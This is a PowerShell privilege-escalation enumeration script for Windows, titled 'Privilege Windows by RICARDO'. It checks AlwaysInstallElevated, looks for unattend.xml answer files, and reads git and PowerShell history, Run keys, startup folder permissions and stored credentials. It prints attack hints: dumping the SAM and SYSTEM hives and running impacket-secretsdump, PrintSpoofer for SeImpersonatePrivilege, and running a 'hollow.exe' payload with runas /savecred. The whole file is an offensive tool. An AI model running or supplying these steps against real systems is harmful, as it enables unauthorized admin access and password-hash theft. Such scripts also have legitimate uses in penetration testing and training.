Write-Output "Privilege Windows by RICARDO"
Write-Output "--------------separation----------------"
Write-Host "AlwaysInstall type:" -ForegroundColor Red
$properties = Get-ItemProperty -Path "Registry::HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" -ErrorAction SilentlyContinue
if ($properties.AlwaysInstallElevated -eq 1) {
    Write-Host "HKCU:AlwaysInstallElevated;
    msiexec /quiet /qn /i NCVInstaller.msi" 
}
$properties = Get-ItemProperty -Path "Registry::HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" -ErrorAction SilentlyContinue
if ($properties.AlwaysInstallElevated -eq 1) {
    Write-Host "HKLM:AlwaysInstallElevated;
    msiexec /quiet /qn /i NCVInstaller.msi" 
}
#AlwaysInstallElevated
Write-Output "--------------separation----------------"
Write-Host "Find unattend.xml " -ForegroundColor Red
# 查找unattend.xml文件
$files = @(
    "C:\Windows\Panther\unattend.xml",
    "C:\Windows\Panther\Unattend\unattend.xml",
    "C:\Windows\System32\Sysprep\unattend.xml",
    "C:\Windows\System32\Sysprep\sysprep.xml",
    "C:\Windows\System32\Sysprep\Panther\unattend.xml",
    "C:\Windows\sysprep.inf",
    "C:\Windows\unattend.xml",
    "C:\unattend.xml",
    "C:\sysprep.inf"
)
foreach ($file in $files) {
    if (Test-Path $file) {
        Write-Host $file
    }
}
#Answer files
Write-Output "--------------separation----------------"
Write-Host "enumerate a GitHub repository:" -ForegroundColor Red
if (Get-Command git -ErrorAction SilentlyContinue) {
    # 如果git命令存在，执行git log
    git log
    Write-Host "git command found;
    hit:git diff <commit> <commit>"
    git show
} else {
    Write-Host "git command not found. Exiting."
}
#leak GITHUBRepository
Write-Output "--------------separation----------------"
Write-Host "powershell history:" -ForegroundColor Red
Get-Content (Get-PSReadlineOption).HistorySavePath
Write-Output "--------------separation----------------"
Write-Host "RegistryRunKeys:" -ForegroundColor Red
Get-ItemProperty -Path "Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Write-Host "hit:mv C:\Windows\Tasks\hollow.exe c:\xx\xx"
#ExecutionRegistryRunKeys
Write-Output "--------------separation----------------"
Write-Host "StartupFolder:" -ForegroundColor Red
icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup";
Write-Host "just wait"
#ExecutionStartupFolder
Write-Output "--------------separation----------------"
Write-Host "check SeBackupPrivilege,SeImpersonatePrivilege:" -ForegroundColor Red
# 执行whoami /priv并获取输出
$privOutput = whoami /priv | Out-String

# 检查SeBackupPrivilege是否开启
if ($privOutput -match "SeBackupPrivilege.*Enabled") {
    Write-Host "SeBackupPrivilege is Enabled;
    hit:reg save hklm\sam C:\temp\sam.hive;
    reg save hklm\system C:\temp\system.hive;
    impacket-secretsdump -sam sam.hive -system system.hive LOCAL"
}

# 检查SeImpersonatePrivilege是否开启
if ($privOutput -match "SeImpersonatePrivilege.*Enabled") {
    
    Write-Host "SeImpersonatePrivilege is enabled;
    hit:PrintSpoofer.exe -i -c cmd"
}
Write-Output "--------------separation----------------"
Write-Host "credentials:" -ForegroundColor Red
cmdkey /list
#存储凭证
Write-Host "find some credentials;
hit:runas /savecred /user:WORKGROUP\Administrator 'C:\Windows\Tasks\hollow.exe'"



